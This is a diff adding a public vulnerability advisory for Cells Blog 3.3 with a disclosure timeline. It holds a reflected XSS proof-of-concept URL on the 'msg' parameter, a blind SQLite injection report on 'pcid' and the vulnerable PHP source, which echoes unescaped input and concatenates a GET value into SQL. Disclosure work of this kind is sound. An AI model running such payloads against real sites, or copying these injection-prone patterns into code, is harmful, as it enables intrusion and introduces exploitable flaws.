@@ -1,0 +1,53 @@
+################################################################
+[+] Exploit: Cells v3.3 XSS Reflected & Blind SQLite Injection #
+[+] Author: vinicius777					       #
+[+] Contact: vinicius777 [AT] gmail @vinicius777_              #	
+[+] version: Cells Blog 3.3				       #
+[+] Vendor Homepage: http://cells.tw	                       #
+################################################################
+
+ 
+[+] 14/01/2014 vendor contacted
+[+] 17/01/2014 no response from vendor
+[+] 20/01/2014 no response from vendor
+[+] 21/01/2014 Published  
+ 
+
+ 
+[1] Reflective XSS on 'msg='
+
+PoC: 
+http://localhost/cells-v3-3/errmsg.php?msg= [%3C%2Fp%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E%3Cp%3E]
+
+
+Vulnerable Code:
+[+] errmsg.php
+
+<?
+                echo "<img src='images/error.gif'>";
+                if (isset($_GET["msg"])){$msg=$_GET["msg"];}else{$msg="";}
+                if ($msg!=""){
+                    echo "<br><br><br>".$msg;
+                }else{
+                        echo "<br><br><br>You may key in something wrong.<br>Please try it again! ..... ";
+                        echo " If you always got this message, <br>please send a <a href='pub_pubmsg.php?bgid=1'>".$face_report."</a>";
+                        echo " to the web master.";
+                }
+                ?> 
+
+ 
+[2] Blind SQLite Injection on 'pcid'
+
+PoC:
+http://localhost/cells-v3-3/user.php?pcid= [SQLite Injection]
+
+Vulnerable Code:
+[+] user.php
+
+if($_GET["pcid"]!=""){
+$sql="select * from users where cdt='n' and pcid=".$_GET["pcid"];
+
+
+#
+#
+# Greetz to g0tm1lk and TheColonial.
